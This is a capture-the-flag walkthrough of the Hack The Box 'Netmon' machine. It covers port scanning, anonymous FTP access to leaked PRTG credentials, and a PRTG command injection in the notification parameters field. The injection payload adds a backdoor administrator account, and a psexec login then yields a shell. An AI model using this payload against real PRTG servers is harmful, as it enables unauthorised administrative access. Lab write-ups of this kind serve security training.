---
icon: windows
---

# Netmon - Easy

<figure><img src="../../.gitbook/assets/image (2901).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/netmon"><strong>Netmon</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.152 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 14:33 EST
Nmap scan report for 10.10.10.152
Host is up (0.027s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_11-10-23  09:20AM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/28%OT=21%CT=1%CU=39540%PV=Y%DS=2%DC=T%G=Y%TM=6929F9
OS:95%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS
OS:=A)SEQ(SP=103%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=104%GCD=1%IS
OS:R=108%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=107%GCD=1%ISR=103%TI=I%CI=I%II=I%S
OS:S=S%TS=A)SEQ(SP=109%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M542NW
OS:8ST11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M5
OS:42ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%
OS:T=80%W=2000%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
OS:T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=
OS:O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-28T12:35:41
|_  start_date: 2025-11-28T12:32:50
|_clock-skew: mean: -7h00m00s, deviation: 0s, median: -7h00m00s

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   87.69 ms 10.10.16.1
2   24.01 ms 10.10.10.152
```

### <mark style="color:$primary;">HTTP 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2906).png" alt=""><figcaption></figcaption></figure>

It looks we are going to need to find some credentials

### <mark style="color:$primary;">FTP 21 TCP</mark>

Anonymous access is allowed! And we have access to the system directories via FTP

```shellscript
ftp $ip
```

<figure><img src="../../.gitbook/assets/image (2903).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2904).png" alt=""><figcaption></figcaption></figure>

Found an interesting Directory named PRTG Network Monitor. And since the box is named Netmon it really caught my attention immediately. Inside I found 4 Interesting Files I am going to download them and check them out.

<figure><img src="../../.gitbook/assets/image (2905).png" alt=""><figcaption></figcaption></figure>

Looking through the files I managed to find a set of credentials `PRTG Configuration.old.bak`

We can try these creds on the website

```bash
prtgadmin:PrTg@dmin2019
```

We had to increment the number at the end to 2019 and we got login!

### <mark style="color:$primary;">PRTG < 18.2.39 OS Command Injection</mark>

<figure><img src="../../.gitbook/assets/image (2907).png" alt=""><figcaption></figcaption></figure>

I found a version on the bottom of the site. Searching for exploits I come across this blog post

{% embed url="https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/" %}

It looks like our version of PRTG is vulnerable to Command Injeciton.

The command injection is in the parameters field of the notifications configuration. I'll follow the blog and try to exploit it.

<mark style="color:green;">**Setup -> Account Settings -> Notifications**</mark>

<figure><img src="../../.gitbook/assets/image (2908).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2909).png" alt=""><figcaption></figcaption></figure>

On the Right side there is a <mark style="color:green;">**plus button**</mark> click it then "<mark style="color:green;">**Add new notification**</mark>". <mark style="color:green;">**Leave everything else as is**</mark>, scroll down to the bottom and select "<mark style="color:green;">**Execute Program**</mark>". For the program File select <mark style="color:green;">**demo.ps1**</mark> then type the following in the parameter field:

```bash
test.txt;net user deimos password123! /add;net localgroup administrators deimos /add
```

<figure><img src="../../.gitbook/assets/image (2911).png" alt=""><figcaption></figcaption></figure>

Click Save, then tick the box of our new notification and then the bell icon on the right.

<figure><img src="../../.gitbook/assets/image (2912).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2913).png" alt=""><figcaption></figcaption></figure>

Now let's check if it worked!

```bash
netexec smb 10.10.10.152 -u deimos -p 'password123!'
```

<figure><img src="../../.gitbook/assets/image (2914).png" alt=""><figcaption></figcaption></figure>

And it did our new user was created! Now we can use impacket-psexec to get a shell on the system

```bash
impacket-psexec deimos:'password123!'@10.10.10.152
```

<figure><img src="../../.gitbook/assets/image (2915).png" alt=""><figcaption></figcaption></figure>

We got a shell as the admin user!
